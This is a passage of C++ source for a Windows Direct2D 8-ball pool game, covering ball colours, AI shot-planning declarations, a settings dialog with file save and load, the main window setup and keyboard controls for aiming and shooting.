    bool cheatModeEnabled = false; // Cheat Mode toggle (G key)
    int draggingBallId = -1;
    bool keyboardAimingActive = false; // NEW FLAG: true when arrow keys modify aim/power
    MCIDEVICEID midiDeviceID = 0; //midi func
    std::atomic<bool> isMusicPlaying(false); //midi func
    std::thread musicThread; //midi func
    void StartMidi(HWND hwnd, const TCHAR* midiPath);
    void StopMidi();

    // UI Element Positions
    D2D1_RECT_F powerMeterRect = { TABLE_RIGHT + CUSHION_THICKNESS + 10, TABLE_TOP, TABLE_RIGHT + CUSHION_THICKNESS + 40, TABLE_BOTTOM };
    D2D1_RECT_F spinIndicatorRect = { TABLE_LEFT - CUSHION_THICKNESS - 60, TABLE_TOP + 20, TABLE_LEFT - CUSHION_THICKNESS - 20, TABLE_TOP + 60 }; // Circle area
    D2D1_POINT_2F spinIndicatorCenter = { spinIndicatorRect.left + (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f, spinIndicatorRect.top + (spinIndicatorRect.bottom - spinIndicatorRect.top) / 2.0f };
    float spinIndicatorRadius = (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f;
    D2D1_RECT_F pocketedBallsBarRect = { TABLE_LEFT, TABLE_BOTTOM + CUSHION_THICKNESS + 30, TABLE_RIGHT, TABLE_BOTTOM + CUSHION_THICKNESS + 70 };

    // Corrected Pocket Center Positions (aligned with table corners/edges)
    const D2D1_POINT_2F pocketPositions[6] = {
        {TABLE_LEFT, TABLE_TOP},                           // Top-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_TOP},      // Top-Middle
        {TABLE_RIGHT, TABLE_TOP},                          // Top-Right
        {TABLE_LEFT, TABLE_BOTTOM},                        // Bottom-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_BOTTOM},   // Bottom-Middle
        {TABLE_RIGHT, TABLE_BOTTOM}                        // Bottom-Right
    };

    // Colors
    const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.1608f, 0.4000f, 0.1765f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    //const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.0f, 0.5f, 0.1f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF(0.3608f, 0.0275f, 0.0078f)); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    //const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF::Red); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    const D2D1_COLOR_F POCKET_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F CUE_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::White);
    const D2D1_COLOR_F EIGHT_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F SOLID_COLOR = D2D1::ColorF(D2D1::ColorF::Goldenrod); // Solids = Yellow Goldenrod
    const D2D1_COLOR_F STRIPE_COLOR = D2D1::ColorF(D2D1::ColorF::DarkOrchid);   // Stripes = Red DarkOrchid
    const D2D1_COLOR_F AIM_LINE_COLOR = D2D1::ColorF(D2D1::ColorF::White, 0.7f); // Semi-transparent white
    const D2D1_COLOR_F FOUL_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(0.1333f, 0.7294f, 0.7490f); //NEWCOLOR 0.1333f, 0.7294f, 0.7490f => ::Blue
    //const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(D2D1::ColorF::Blue);
    const D2D1_COLOR_F ENGLISH_DOT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F UI_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Black);

    // --------------------------------------------------------------------
//  Realistic colours for each id (0-15)
//  0 = cue-ball (white) | 1-7 solids | 8 = eight-ball | 9-15 stripes
// --------------------------------------------------------------------
    static const D2D1_COLOR_F BALL_COLORS[16] =
    {
        D2D1::ColorF(D2D1::ColorF::White),          // 0  cue
        D2D1::ColorF(1.00f, 0.85f, 0.00f),          // 1  yellow
        D2D1::ColorF(0.05f, 0.30f, 1.00f),          // 2  blue
        D2D1::ColorF(0.90f, 0.10f, 0.10f),          // 3  red
        D2D1::ColorF(0.55f, 0.25f, 0.85f),          // 4  purple
        D2D1::ColorF(1.00f, 0.55f, 0.00f),          // 5  orange
        D2D1::ColorF(0.00f, 0.60f, 0.30f),          // 6  green
        D2D1::ColorF(0.50f, 0.05f, 0.05f),          // 7  maroon / burgundy
        D2D1::ColorF(D2D1::ColorF::Black),          // 8  black
        D2D1::ColorF(1.00f, 0.85f, 0.00f),          // 9  (yellow stripe)
        D2D1::ColorF(0.05f, 0.30f, 1.00f),          // 10 blue stripe
        D2D1::ColorF(0.90f, 0.10f, 0.10f),          // 11 red stripe
        D2D1::ColorF(0.55f, 0.25f, 0.85f),          // 12 purple stripe
        D2D1::ColorF(1.00f, 0.55f, 0.00f),          // 13 orange stripe
        D2D1::ColorF(0.00f, 0.60f, 0.30f),          // 14 green stripe
        D2D1::ColorF(0.50f, 0.05f, 0.05f)           // 15 maroon stripe
    };

    // Quick helper
    inline D2D1_COLOR_F GetBallColor(int id)
    {
        return (id >= 0 && id < 16) ? BALL_COLORS[id]
            : D2D1::ColorF(D2D1::ColorF::White);
    }

    // --- Forward Declarations ---
    HRESULT CreateDeviceResources();
    void DiscardDeviceResources();
    void OnPaint();
    void OnResize(UINT width, UINT height);
    void InitGame();
    void GameUpdate();
    void UpdatePhysics();
    void CheckCollisions();
    bool CheckPockets(); // Returns true if any ball was pocketed
    void ProcessShotResults();
    void ApplyShot(float power, float angle, float spinX, float spinY);
    void RespawnCueBall(bool behindHeadstring);
    bool AreBallsMoving();
    void SwitchTurns();
    //bool AssignPlayerBallTypes(BallType firstPocketedType);
    bool AssignPlayerBallTypes(BallType firstPocketedType,
        bool creditShooter = true);
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed);
    Ball* GetBallById(int id);
    Ball* GetCueBall();
    //void PlayGameMusic(HWND hwnd); //midi func
    void AIBreakShot();

    // Drawing Functions
    void DrawScene(ID2D1RenderTarget* pRT);
    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory);
    void DrawBalls(ID2D1RenderTarget* pRT);
    void DrawCueStick(ID2D1RenderTarget* pRT);
    void DrawAimingAids(ID2D1RenderTarget* pRT);
    void DrawUI(ID2D1RenderTarget* pRT);
    void DrawPowerMeter(ID2D1RenderTarget* pRT);
    void DrawSpinIndicator(ID2D1RenderTarget* pRT);
    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT);
    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT);
    // NEW
    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT);

    // Helper Functions
    float GetDistance(float x1, float y1, float x2, float y2);
    float GetDistanceSq(float x1, float y1, float x2, float y2);
    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring);
    template <typename T> void SafeRelease(T** ppT);
    // --- NEW HELPER FORWARD DECLARATIONS ---
    bool IsPlayerOnEightBall(int player);
    void CheckAndTransitionToPocketChoice(int playerID);
    // --- ADD FORWARD DECLARATION FOR NEW HELPER HERE ---
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b);
    // --- End Forward Declaration ---
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection); // Keep this if present

    // --- NEW Forward Declarations ---

    // AI Related
    struct AIShotInfo; // Define below
    void TriggerAIMove();
    void AIMakeDecision();
    void AIPlaceCueBall();
    AIShotInfo AIFindBestShot();
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex);
    bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2);
    Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq); // Added hitDistSq output
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist);
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex);
    bool IsValidAIAimAngle(float angle); // Basic check

    // Dialog Related
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
    void ShowNewGameDialog(HINSTANCE hInstance);
    void LoadSettings(); // For deserialization
    void SaveSettings(); // For serialization
    const std::wstring SETTINGS_FILE_NAME = L""Pool-Settings.txt"";
    void ResetGame(HINSTANCE hInstance); // Function to handle F2 reset

    // --- Forward Declaration for Window Procedure --- <<< Add this line HERE
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

    // --- NEW Struct for AI Shot Evaluation ---
    struct AIShotInfo {
        bool possible = false;          // Is this shot considered viable?
        Ball* targetBall = nullptr;     // Which ball to hit
        int pocketIndex = -1;           // Which pocket to aim for (0-5)
        D2D1_POINT_2F ghostBallPos = { 0,0 }; // Where cue ball needs to hit target ball
        float angle = 0.0f;             // Calculated shot angle
        float power = 0.0f;             // Calculated shot power
        float score = -1.0f;            // Score for this shot (higher is better)
        bool involves8Ball = false;     // Is the target the 8-ball?
        float spinX = 0.0f;
        float spinY = 0.0f;
    };

    /*
    table = TABLE_COLOR new: #29662d (0.1608, 0.4000, 0.1765) => old: (0.0f, 0.5f, 0.1f)
    rail CUSHION_COLOR = #5c0702 (0.3608, 0.0275, 0.0078) => ::Red
    gap = #e99d33 (0.9157, 0.6157, 0.2000) => ::Orange
    winbg = #5e8863 (0.3686, 0.5333, 0.3882) => 1.0f, 1.0f, 0.803f
    headstring = #47742f (0.2784, 0.4549, 0.1843) => ::White
    bluearrow = #08b0a5 (0.0314, 0.6902, 0.6471) *#22babf (0.1333,0.7294,0.7490) => ::Blue
    */

    // --- NEW Settings Serialization Functions ---
    void SaveSettings() {
        std::ofstream outFile(SETTINGS_FILE_NAME);
        if (outFile.is_open()) {
            outFile << static_cast<int>(gameMode) << std::endl;
            outFile << static_cast<int>(aiDifficulty) << std::endl;
            outFile << static_cast<int>(openingBreakMode) << std::endl;
            outFile.close();
        }
        // else: Handle error, e.g., log or silently fail
    }

    void LoadSettings() {
        std::ifstream inFile(SETTINGS_FILE_NAME);
        if (inFile.is_open()) {
            int gm, aid, obm;
            if (inFile >> gm) {
                gameMode = static_cast<GameMode>(gm);
            }
            if (inFile >> aid) {
                aiDifficulty = static_cast<AIDifficulty>(aid);
            }
            if (inFile >> obm) {
                openingBreakMode = static_cast<OpeningBreakMode>(obm);
            }
            inFile.close();

            // Validate loaded settings (optional, but good practice)
            if (gameMode < HUMAN_VS_HUMAN || gameMode > HUMAN_VS_AI) gameMode = HUMAN_VS_HUMAN; // Default
            if (aiDifficulty < EASY || aiDifficulty > HARD) aiDifficulty = MEDIUM; // Default
            if (openingBreakMode < CPU_BREAK || openingBreakMode > FLIP_COIN_BREAK) openingBreakMode = CPU_BREAK; // Default
        }
        // else: File doesn't exist or couldn't be opened, use defaults (already set in global vars)
    }
    // --- End Settings Serialization Functions ---

    // --- NEW Dialog Procedure ---
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
        switch (message) {
        case WM_INITDIALOG:
        {
            // --- ACTION 4: Center Dialog Box ---
    // Optional: Force centering if default isn't working
            RECT rcDlg, rcOwner, rcScreen;
            HWND hwndOwner = GetParent(hDlg); // GetParent(hDlg) might be better if hwndMain is passed
            if (hwndOwner == NULL) hwndOwner = GetDesktopWindow();

            GetWindowRect(hwndOwner, &rcOwner);
            GetWindowRect(hDlg, &rcDlg);
            CopyRect(&rcScreen, &rcOwner); // Use owner rect as reference bounds

            // Offset the owner rect relative to the screen if it's not the desktop
            if (GetParent(hDlg) != NULL) { // If parented to main window (passed to DialogBoxParam)
                OffsetRect(&rcOwner, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcDlg, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcScreen, -rcScreen.left, -rcScreen.top);
            }


            // Calculate centered position
            int x = rcOwner.left + (rcOwner.right - rcOwner.left - (rcDlg.right - rcDlg.left)) / 2;
            int y = rcOwner.top + (rcOwner.bottom - rcOwner.top - (rcDlg.bottom - rcDlg.top)) / 2;

            // Ensure it stays within screen bounds (optional safety)
            x = std::max(static_cast<int>(rcScreen.left), x);
            y = std::max(static_cast<int>(rcScreen.top), y);
            if (x + (rcDlg.right - rcDlg.left) > rcScreen.right)
                x = rcScreen.right - (rcDlg.right - rcDlg.left);
            if (y + (rcDlg.bottom - rcDlg.top) > rcScreen.bottom)
                y = rcScreen.bottom - (rcDlg.bottom - rcDlg.top);


            // Set the dialog position
            SetWindowPos(hDlg, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);

            // --- End Centering Code ---

            // Set initial state based on current global settings (or defaults)
            CheckRadioButton(hDlg, IDC_RADIO_2P, IDC_RADIO_CPU, (gameMode == HUMAN_VS_HUMAN) ? IDC_RADIO_2P : IDC_RADIO_CPU);

            CheckRadioButton(hDlg, IDC_RADIO_EASY, IDC_RADIO_HARD,
                (aiDifficulty == EASY) ? IDC_RADIO_EASY : ((aiDifficulty == MEDIUM) ? IDC_RADIO_MEDIUM : IDC_RADIO_HARD));

            // Enable/Disable AI group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), gameMode == HUMAN_VS_AI);
            // Set initial state for Opening Break Mode
            CheckRadioButton(hDlg, IDC_RADIO_CPU_BREAK, IDC_RADIO_FLIP_BREAK,
                (openingBreakMode == CPU_BREAK) ? IDC_RADIO_CPU_BREAK : ((openingBreakMode == P1_BREAK) ? IDC_RADIO_P1_BREAK : IDC_RADIO_FLIP_BREAK));
            // Enable/Disable Opening Break group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), gameMode == HUMAN_VS_AI);
        }
        return (INT_PTR)TRUE;

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
            case IDC_RADIO_2P:
            case IDC_RADIO_CPU:
            {
                bool isCPU = IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED;
                // Enable/Disable AI group controls based on selection
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), isCPU);
                // Also enable/disable Opening Break Mode group
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), isCPU);
            }
            return (INT_PTR)TRUE;

            case IDOK:
                // Retrieve selected options and store in global variables
                if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED) {
                    gameMode = HUMAN_VS_AI;
                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_EASY) == BST_CHECKED) aiDifficulty = EASY;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_MEDIUM) == BST_CHECKED) aiDifficulty = MEDIUM;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_HARD) == BST_CHECKED) aiDifficulty = HARD;

                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU_BREAK) == BST_CHECKED) openingBreakMode = CPU_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_P1_BREAK) == BST_CHECKED) openingBreakMode = P1_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_FLIP_BREAK) == BST_CHECKED) openingBreakMode = FLIP_COIN_BREAK;
                }
                else {
                    gameMode = HUMAN_VS_HUMAN;
                    // openingBreakMode doesn't apply to HvsH, can leave as is or reset
                }
                SaveSettings(); // Save settings when OK is pressed
                EndDialog(hDlg, IDOK); // Close dialog, return IDOK
                return (INT_PTR)TRUE;

            case IDCANCEL: // Handle Cancel or closing the dialog
                // Optionally, could reload settings here if you want cancel to revert to previously saved state
                EndDialog(hDlg, IDCANCEL);
                return (INT_PTR)TRUE;
            }
            break; // End WM_COMMAND
        }
        return (INT_PTR)FALSE; // Default processing
    }

    // --- NEW Helper to Show Dialog ---
    void ShowNewGameDialog(HINSTANCE hInstance) {
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), hwndMain, NewGameDialogProc, 0) == IDOK) {
            // User clicked Start, reset game with new settings
            isPlayer2AI = (gameMode == HUMAN_VS_AI); // Update AI flag
            if (isPlayer2AI) {
                switch (aiDifficulty) {
                case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
                case MEDIUM: player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
                case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
                }
            }
            else {
                player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
            }
            // Update window title
            std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
            if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
            else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";
            SetWindowText(hwndMain, windowTitle.c_str());

            InitGame(); // Re-initialize game logic & board
            InvalidateRect(hwndMain, NULL, TRUE); // Force redraw
        }
        else {
            // User cancelled dialog - maybe just resume game? Or exit?
            // For simplicity, we do nothing, game continues as it was.
            // To exit on cancel from F2, would need more complex state management.
        }
    }

    // --- NEW Reset Game Function ---
    void ResetGame(HINSTANCE hInstance) {
        // Call the helper function to show the dialog and re-init if OK clicked
        ShowNewGameDialog(hInstance);
    }

    // --- WinMain ---
    int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
        if (FAILED(CoInitialize(NULL))) {
            MessageBox(NULL, L""COM Initialization Failed."", L""Error"", MB_OK | MB_ICONERROR);
            return -1;
        }

        // --- NEW: Load settings at startup ---
        LoadSettings();

        // --- NEW: Show configuration dialog FIRST ---
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), NULL, NewGameDialogProc, 0) != IDOK) {
            // User cancelled the dialog
            CoUninitialize();
            return 0; // Exit gracefully if dialog cancelled
        }
        // Global gameMode and aiDifficulty are now set by the DialogProc

        // Set AI flag based on game mode
        isPlayer2AI = (gameMode == HUMAN_VS_AI);
        if (isPlayer2AI) {
            switch (aiDifficulty) {
            case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
            case MEDIUM:player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
            case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
            }
        }
        else {
            player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
        }
        // --- End of Dialog Logic ---


        WNDCLASS wc = { };
        wc.lpfnWndProc = WndProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/;
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Use your actual icon ID here

        if (!RegisterClass(&wc)) {
            MessageBox(NULL, L""Window Registration Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // --- ACTION 4: Calculate Centered Window Position ---
        const int WINDOW_WIDTH = 1000; // Define desired width
        const int WINDOW_HEIGHT = 700; // Define desired height
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        int windowX = (screenWidth - WINDOW_WIDTH) / 2;
        int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

        // --- Change Window Title based on mode ---
        std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
        if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
        else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";

        DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; // No WS_THICKFRAME, No WS_MAXIMIZEBOX

        hwndMain = CreateWindowEx(
            0, L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/, windowTitle.c_str(), dwStyle,
            windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
            NULL, NULL, hInstance, NULL
        );

        if (!hwndMain) {
            MessageBox(NULL, L""Window Creation Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // Initialize Direct2D Resources AFTER window creation
        if (FAILED(CreateDeviceResources())) {
            MessageBox(NULL, L""Failed to create Direct2D resources."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        InitGame(); // Initialize game state AFTER resources are ready & mode is set
        Sleep(500); // Allow window to fully initialize before starting the countdown //midi func
        StartMidi(hwndMain, TEXT(""BSQ.MID"")); // Replace with your MIDI filename
        //PlayGameMusic(hwndMain); //midi func

        ShowWindow(hwndMain, nCmdShow);
        UpdateWindow(hwndMain);

        if (!SetTimer(hwndMain, ID_TIMER, 1000 / TARGET_FPS, NULL)) {
            MessageBox(NULL, L""Could not SetTimer()."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        MSG msg = { };
        // --- Modified Main Loop ---
        // Handles the case where the game starts in SHOWING_DIALOG state (handled now before loop)
        // or gets reset to it via F2. The main loop runs normally once game starts.
        while (GetMessage(&msg, NULL, 0, 0)) {
            // We might need modeless dialog handling here if F2 shows dialog
            // while window is active, but DialogBoxParam is modal.
            // Let's assume F2 hides main window, shows dialog, then restarts game loop.
            // Simpler: F2 calls ResetGame which calls DialogBoxParam (modal) then InitGame.
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        KillTimer(hwndMain, ID_TIMER);
        DiscardDeviceResources();
        SaveSettings(); // Save settings on exit
        CoUninitialize();

        return (int)msg.wParam;
    }

    // --- WndProc ---
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        // Declare cueBall pointer once at the top, used in multiple cases
        // For clarity, often better to declare within each case where needed.
        Ball* cueBall = nullptr; // Initialize to nullptr
        switch (msg) {
        case WM_CREATE:
            // Resources are now created in WinMain after CreateWindowEx
            return 0;

        case WM_PAINT:
            OnPaint();
            // Validate the entire window region after painting
            ValidateRect(hwnd, NULL);
            return 0;

        case WM_SIZE: {
            UINT width = LOWORD(lParam);
            UINT height = HIWORD(lParam);
            OnResize(width, height);
            return 0;
        }

        case WM_TIMER:
            if (wParam == ID_TIMER) {
                GameUpdate(); // Update game logic and physics
                InvalidateRect(hwnd, NULL, FALSE); // Request redraw
            }
            return 0;

            // --- NEW: Handle F2 Key for Reset ---
            // --- MODIFIED: Handle More Keys ---
        case WM_KEYDOWN:
        { // Add scope for variable declarations

            // --- FIX: Get Cue Ball pointer for this scope ---
            cueBall = GetCueBall();
            // We might allow some keys even if cue ball is gone (like F1/F2), but actions need it
            // --- End Fix ---

            // Check which player can interact via keyboard (Humans only)
            bool canPlayerControl = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P1 || currentGameState == PRE_BREAK_PLACEMENT)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT)));

            // --- F1 / F2 Keys (Always available) ---
            if (wParam == VK_F2) {
                HINSTANCE hInstance = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
                ResetGame(hInstance); // Call reset function
                return 0; // Indicate key was processed
            }
            else if (wParam == VK_F1) {
                MessageBox(hwnd,
                    L""Direct2D-based StickPool game made in C++ from scratch (4827+ lines of code)\n"" // Update line count if needed {2764+ lines}
                    L""First successful Clone in C++ (no other sites or projects were there to glean from.) Made /w AI assist\n""
                    L""(others were in JS/ non-8-Ball in C# etc.) w/o OOP and Graphics Frameworks all in a Single file.\n""
                    L""Copyright (C) 2025 Evans Thorpemorton, Entisoft Solutions.\n""
                    L""Includes AI Difficulty Modes, Aim-Trajectory For Table Rails + Hard Angles TipShots. || F2=New Game"",
                    L""About This Game"", MB_OK | MB_ICONINFORMATION);
                return 0; // Indicate key was processed
            }

            // Check for 'M' key (uppercase or lowercase)
                // Toggle music with ""M""
            if (wParam == 'M' || wParam == 'm') {
                //static bool isMusicPlaying = false;
                if (isMusicPlaying) {
                    // Stop the music
                    StopMidi();
                    isMusicPlaying = false;
                }
                else {
                    // Build the MIDI file path
                    TCHAR midiPath[MAX_PATH];
                    GetModuleFileName(NULL, midiPath, MAX_PATH);
                    // Keep only the directory part
                    TCHAR* lastBackslash = _tcsrchr(midiPath, '\\');
                    if (lastBackslash != NULL) {
                        *(lastBackslash + 1) = '\0';
                    }
                    // Append the MIDI filename
                    _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID"")); // Adjust filename if needed

                    // Start playing MIDI
                    StartMidi(hwndMain, midiPath);
                    isMusicPlaying = true;
                }
            }


            // --- Player Interaction Keys (Only if allowed) ---
            if (canPlayerControl) {
                // --- Get Shift Key State ---
                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                float angleStep = shiftPressed ? 0.05f : 0.01f; // Base step / Faster step (Adjust as needed) // Multiplier was 5x
                float powerStep = 0.2f; // Power step (Adjust as needed)

                switch (wParam) {
                case VK_LEFT: // Rotate Cue Stick Counter-Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle -= angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle < 0) cueAngle += 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_RIGHT: // Rotate Cue Stick Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle += angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle >= 2 * PI) cueAngle -= 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_UP: // Decrease Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower -= powerStep;
                        if (shotPower < 0.0f) shotPower = 0.0f;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_DOWN: // Increase Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower += powerStep;
                        if (shotPower > MAX_SHOT_POWER) shotPower = MAX_SHOT_POWER;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_SPACE: // Trigger Shot
                    if ((currentGameState == AIMING || currentGameState == BREAKING || currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING)
                    {
                        if (shotPower > 0.15f) { // Use same threshold as mouse
                           // Reset foul flags BEFORE applying shot
                            firstHitBallIdThisShot = -1;
                            cueHitObjectBallThisShot = false;
                            railHitAfterContact = false;

                            // Play sound & Apply Shot
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                            ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);

                            // Update State
